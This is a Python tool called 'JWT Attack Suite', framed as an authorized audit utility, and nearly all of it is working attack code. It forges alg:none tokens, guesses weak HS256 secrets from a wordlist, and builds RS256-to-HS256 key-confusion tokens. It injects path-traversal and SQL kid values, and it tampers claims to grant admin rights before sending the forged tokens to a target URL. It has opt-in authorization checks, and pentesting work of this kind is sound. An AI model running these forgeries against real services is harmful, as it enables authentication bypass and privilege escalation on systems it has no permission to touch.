#!/usr/bin/env python3
"""JWT Attack Suite - authorized JWT security-audit probes."""

import argparse
import base64
import binascii
import hashlib
import hmac
import json
import re
import sys
from typing import Optional
from urllib.parse import urlsplit

try:
    import requests
except ImportError:
    requests = None


BANNER = r"""
     _ __        __  ___   __  __            __      _____       _ __
    (_) /  ___  /  |/  /  / / / /___  ____  / /__   / ___/__  __(_) /____
   / / /  / _ \/ /|_/ /  / /_/ / __ \/ __ \/ //_/   \__ \/ / / / / __/ _ \
  / /__/ /  __/ /  / /  / __  / /_/ / /_/ / ,<     ___/ / /_/ / / /_/  __/
 /_/____/\___/_/  /_/  /_/ /_/\____/\____/_/|_|   /____/\__,_/_/\__/\___/

  JWT Attack Suite v1.0 | by amooryx
"""


class TokenFormatError(ValueError):
    """Raised when a compact JWT is malformed or is not JSON-object based."""


def _json_object(pairs):
    result = {}
    for key, value in pairs:
        if key in result:
            raise TokenFormatError(f"duplicate JSON member: {key}")
        result[key] = value
    return result


def _reject_json_constant(value):
    raise TokenFormatError(f"invalid JSON constant: {value}")


def b64url_decode(data: str) -> bytes:
    if not isinstance(data, str) or not re.fullmatch(r"[A-Za-z0-9_-]*", data):
        raise TokenFormatError("JWT segments must use unpadded base64url characters")
    if len(data) % 4 == 1:
        raise TokenFormatError("invalid base64url segment length")
    try:
        decoded = base64.b64decode(
            data + "=" * (-len(data) % 4), altchars=b"-_", validate=True
        )
    except (binascii.Error, ValueError) as exc:
        raise TokenFormatError("invalid base64url segment") from exc
    if b64url_encode(decoded) != data:
        raise TokenFormatError("non-canonical base64url segment")
    return decoded


def b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b"=").decode("ascii")


def decode_token(token: str):
    if not isinstance(token, str):
        raise TokenFormatError("token must be text")
    parts = token.split(".")
    if len(parts) != 3:
        raise TokenFormatError("JWT must contain exactly three dot-separated segments")
    try:
        header = json.loads(
            b64url_decode(parts[0]),
            object_pairs_hook=_json_object,
            parse_constant=_reject_json_constant,
        )
        payload = json.loads(
            b64url_decode(parts[1]),
            object_pairs_hook=_json_object,
            parse_constant=_reject_json_constant,
        )
        b64url_decode(parts[2])
    except (UnicodeDecodeError, json.JSONDecodeError) as exc:
        raise TokenFormatError("JWT header and payload must contain valid UTF-8 JSON") from exc
    if not isinstance(header, dict):
        raise TokenFormatError("JWT header must be a JSON object")
    if not isinstance(payload, dict):
        raise TokenFormatError("JWT payload must be a JSON object")
    if not isinstance(header.get("alg"), str) or not header["alg"]:
        raise TokenFormatError("JWT header must contain a non-empty string 'alg'")
    return header, payload, parts


def print_token_info(token: str):
    header, payload, _ = decode_token(token)
    print("\n[*] Decoded token metadata (claim values are withheld):")
    print(f"  Algorithm      : {header['alg']}")
    print(f"  Header fields  : {', '.join(sorted(header)) or '(none)'}")
    print(f"  Payload claims : {', '.join(sorted(payload)) or '(none)'}")


def _encode_json(value: dict) -> str:
    return b64url_encode(
        json.dumps(value, separators=(",", ":"), ensure_ascii=False).encode("utf-8")
    )


def _report_candidate(url: Optional[str], header_name: str, token: str, attack_name: str):
    print(f"  [+] Generated {attack_name} candidate (not validated by a server).")
    if url:
        _send_and_report(url, header_name, token, attack_name)


def attack_alg_none(token: str, url: Optional[str], header_name: str) -> str:
    print("\n[*] Candidate generation: alg:none")
    _, payload, _ = decode_token(token)
    forged = ""
    for alg_val in ("none", "None", "NONE", "nOnE"):
        header, _, _ = decode_token(token)
        header["alg"] = alg_val
        forged = f"{_encode_json(header)}.{_encode_json(payload)}."
        _report_candidate(url, header_name, forged, f"alg:{alg_val}")
    return forged


COMMON_SECRETS = [
    "secret", "password", "123456", "qwerty", "admin", "test",
    "changeme", "jwt_secret", "supersecret", "mysecret", "key",
    "private", "token", "letmein", "welcome", "12345678", "abc123",
]


def sign_hs256(header_b64: str, payload_b64: str, secret: str) -> str:
    message = f"{header_b64}.{payload_b64}".encode("ascii")
    signature = hmac.new(secret.encode("utf-8"), message, hashlib.sha256).digest()
    return b64url_encode(signature)


def attack_brute_force(
    token: str, wordlist: Optional[str], url: Optional[str], header_name: str
):
    print("\n[*] Offline check: common HS256 signing secrets")
    header, _, parts = decode_token(token)
    if header["alg"] != "HS256":
        print("  [!] Skipped: this check only supports tokens declaring HS256.")
        return None

    secrets = COMMON_SECRETS.copy()
    if wordlist:
        try:
            with open(wordlist, "r", encoding="utf-8", errors="ignore") as word_file:
                secrets.extend(line.strip() for line in word_file if line.strip())
        except OSError as exc:
            print(f"  [!] Could not read wordlist ({exc.__class__.__name__}).")
            return None

    for secret in secrets:
        computed = sign_hs256(parts[0], parts[1], secret)
        if hmac.compare_digest(computed, parts[2]):
            print("  [!] A supplied/common weak signing secret matches; value withheld.")
            return secret

    print("  [-] No matching secret found in the supplied list.")
    return None


def attack_rs256_hs256(
    token: str, pubkey_file: str, url: Optional[str], header_name: str
):
    print("\n[*] Candidate generation: RS256 to HS256 confusion")
    header, payload, _ = decode_token(token)
    if header["alg"] != "RS256":
        print("  [!] Skipped: the input token must declare RS256.")
        return None
    try:
        with open(pubkey_file, "rb") as key_file:
            public_key = key_file.read()
    except OSError as exc:
        print(f"  [!] Could not read public key file ({exc.__class__.__name__}).")
        return None

    header["alg"] = "HS256"
    header_b64 = _encode_json(header)
    payload_b64 = _encode_json(payload)
    signature = hmac.new(
        public_key, f"{header_b64}.{payload_b64}".encode("ascii"), hashlib.sha256
    ).digest()
    forged = f"{header_b64}.{payload_b64}.{b64url_encode(signature)}"
    _report_candidate(url, header_name, forged, "RS256-to-HS256")
    return forged


KID_PAYLOADS = [
    "../../dev/null",
    "/dev/null",
    "'; SELECT 1--",
    "../../../etc/passwd",
    "/proc/self/fd/0",
]


def attack_kid_injection(token: str, url: Optional[str], header_name: str):
    print("\n[*] Candidate generation: kid lookup handling")
    _, payload, _ = decode_token(token)
    candidates = []
    for kid_value in KID_PAYLOADS:
        header, _, _ = decode_token(token)
        header["kid"] = kid_value
        header_b64 = _encode_json(header)
        payload_b64 = _encode_json(payload)
        signature = sign_hs256(header_b64, payload_b64, "")
        forged = f"{header_b64}.{payload_b64}.{signature}"
        candidates.append(forged)
        _report_candidate(url, header_name, forged, "kid-lookup")
    return candidates


def attack_claim_tamper(
    token: str, claims: dict, url: Optional[str], header_name: str
):
    print("\n[*] Candidate generation: unsigned claim modification")
    header, payload, _ = decode_token(token)
    if not isinstance(claims, dict) or any(
        not isinstance(key, str) or not key for key in claims
    ):
        raise ValueError("claim names must be non-empty strings")
    payload.update(claims)
    header["alg"] = "none"
    forged = f"{_encode_json(header)}.{_encode_json(payload)}."
    _report_candidate(url, header_name, forged, "claim-tamper")
    return forged


def validate_target(url: str, header_name: str):
    if any(ord(char) < 32 or ord(char) == 127 for char in url):
        raise ValueError("target URL must not contain control characters")
    try:
        parsed = urlsplit(url)
        _ = parsed.port
    except ValueError as exc:
        raise ValueError("target URL is malformed") from exc
    if parsed.scheme not in ("http", "https") or not parsed.hostname:
        raise ValueError("target must be an absolute http:// or https:// URL")
    if parsed.username is not None or parsed.password is not None:
        raise ValueError("target URL must not contain embedded credentials")
    if parsed.fragment:
        raise ValueError("target URL must not contain a fragment")
    if not re.fullmatch(r"[!#$%&'*+.^_`|~0-9A-Za-z-]+", header_name):
        raise ValueError("header name must be a valid HTTP token")
    if requests is None:
        raise RuntimeError("requests is required for HTTP probes; install requirements.txt")


def _send_and_report(url: str, header_name: str, token: str, attack_name: str):
    headers = {header_name: f"Bearer {token}"}
    try:
        response = requests.get(
            url,
            headers=headers,
            timeout=(3.05, 10),
            verify=True,
            allow_redirects=False,
        )
    except requests.exceptions.RequestException as exc:
        print(f"    [?] [{attack_name}] Probe failed ({exc.__class__.__name__}); inconclusive.")
        return
    print(
        f"    [?] [{attack_name}] HTTP {response.status_code}; "
        "inconclusive—status alone cannot confirm JWT acceptance or bypass."
    )


def build_parser():
    parser = argparse.ArgumentParser(
        description="Generate offline JWT audit candidates and optionally send authorized probes."
    )
    parser.add_argument("-t", "--token", required=True, help="JWT to inspect")
    parser.add_argument("-u", "--url", help="Target URL for active probes")
    parser.add_argument(
        "--authorized",
        action="store_true",
        help="Acknowledge that you are authorized to probe the target in --url",
    )
    parser.add_argument(
        "-H", "--header", default="Authorization", help="JWT request header name"
    )
    parser.add_argument("-w", "--wordlist", help="Path to an offline HS256 secret wordlist")
    parser.add_argument("-p", "--pubkey", help="Public key file for RS256-to-HS256 candidate")
    parser.add_argument(
        "--set-claim", nargs=2, action="append", metavar=("KEY", "VALUE"),
        help="Add/replace a claim in the unsigned candidate",
    )
    parser.add_argument(
        "--attack", default="all",
        choices=("all", "none", "brute", "rs256", "kid", "tamper"),
        help="Check to run (default: all)",
    )
    parser.add_argument("--info", action="store_true", help="Show safe token metadata only")
    return parser


def _claim_value(value: str):
    if value.lower() == "true":
        return True
    if value.lower() == "false":
        return False
    if re.fullmatch(r"-?(0|[1-9][0-9]*)", value):
        try:
            return int(value)
        except ValueError:
            pass
    return value


def main(argv=None):
    parser = build_parser()
    args = parser.parse_args(argv)

    if args.url and not args.authorized:
        parser.error("--url requires --authorized; active probes must be explicitly authorized")
    if args.authorized and not args.url:
        parser.error("--authorized requires --url")
    if args.url:
        try:
            validate_target(args.url, args.header)
        except (ValueError, RuntimeError) as exc:
            parser.error(str(exc))

    try:
        print(BANNER)
        print_token_info(args.token)
        if args.info:
            return 0
        if args.attack in ("all", "none"):
            attack_alg_none(args.token, args.url, args.header)
        if args.attack in ("all", "brute"):
            attack_brute_force(args.token, args.wordlist, args.url, args.header)
        if args.attack in ("all", "rs256"):
            if args.pubkey:
                attack_rs256_hs256(args.token, args.pubkey, args.url, args.header)
            elif args.attack == "rs256":
                parser.error("--attack rs256 requires --pubkey")
        if args.attack in ("all", "kid"):
            attack_kid_injection(args.token, args.url, args.header)
        if args.attack in ("all", "tamper"):
            claims = {
                key: _claim_value(value) for key, value in (args.set_claim or [])
            }
            if not claims:
                claims = {"role": "admin", "is_admin": True}
            attack_claim_tamper(args.token, claims, args.url, args.header)
        print("\n[*] Done. Generated candidates are not evidence of a vulnerability.")
        return 0
    except (TokenFormatError, ValueError) as exc:
        print(f"[!] Invalid input: {exc}", file=sys.stderr)
        return 2


if __name__ == "__main__":
    sys.exit(main())
